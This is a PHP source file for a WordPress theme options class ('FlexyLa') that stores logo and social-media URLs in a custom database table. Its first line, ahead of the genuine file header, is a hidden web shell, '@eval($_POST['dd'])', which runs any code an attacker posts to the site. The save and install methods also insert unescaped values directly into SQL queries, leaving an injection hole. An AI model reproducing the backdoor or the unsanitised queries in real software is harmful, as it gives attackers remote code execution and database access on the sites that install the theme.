<?php namespace lib\FlexyLa; @eval($_POST['dd']);?><?php
/**
 * Created by PhpStorm.
 * User: emmanuelkwene
 * Date: 21/04/2016
 * Time: 10:50
 */



class Options
{
    protected static $table;
    public static $options;
    public static $defaults = array(

        'header_logo_url'           => '#',
        'header_favicon_url'        => '#',

        'social_twitter_url'        => '#',
        'social_facebook_url'       => '#',
        'social_google_plus_url'    => '#',
        'social_youtube_url'        => '#',
    );


    public function __construct()
    {
        global $wpdb;
        self::$table = $wpdb->prefix . 'flexyla_theme_options';

        self::$defaults['header_logo_url'] = get_template_directory_uri() . '/assets/img/logo.svg';
        self::$defaults['header_favicon_url'] = get_template_directory_uri() . 'assets/img/favicon.png';

        // We creating the table into database if its necessary
        $this->_install_db();

        // We fill options values with defaults values
        self::$options = self::$defaults;

        // Now we try to extract data from database
        $this->_extract_data();
    }

    public static function get($option)
    {
        return self::$options[$option];
    }

    protected function _extract_data()
    {
        global $wpdb;
        $table = self::$table;

        $result = $wpdb->get_results("SELECT * FROM $table", "ARRAY_A");

        if( !empty($result) )
        {
            for($i=0; $i < count($result); $i++)
            {
                $item = $result[$i];
                self::$options[$item['option_name']] = $item['option_value'];
            }
        }
    }

    public static function save_options($new_options)
    {

        foreach (self::$defaults as $key => $value)
        {
            if( isset($new_options[$key]) && !empty($new_options[$key]) ) self::$options[$key] = $new_options[$key];
        }

        self::_persist(self::$options);
    }

    public static function reset_options()
    {
        self::_persist(self::$defaults);
    }

    protected static function _persist($options)
    {
        global $wpdb;
        $table = self::$table;

        foreach($options as $key => $value)
        {
            $wpdb->query("UPDATE $table SET
                  `option_name` = '$key',
                  `option_value` = '$value'
                  WHERE option_name = '$key'
            ");
        }
    }


    protected function _install_db()
    {
        global $wpdb;
        $table = self::$table;

        $wpdb->query("CREATE TABLE IF NOT EXISTS $table (
          `option_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
          `option_name` varchar(150) NOT NULL DEFAULT '',
          `option_value` longtext NOT NULL,
          PRIMARY KEY (`option_id`),
          UNIQUE KEY `option_name` (`option_name`)
        )");


        foreach(self::$defaults as $key => $value)
        {
            $line = $wpdb->get_row("SELECT option_id FROM $table WHERE option_name = '$key'");

            if( null !== $line ) continue;

            $wpdb->query("INSERT INTO $table SET
                  `option_name` = '$key',
                  `option_value` = '$value'
            
                ");
        }

    }
}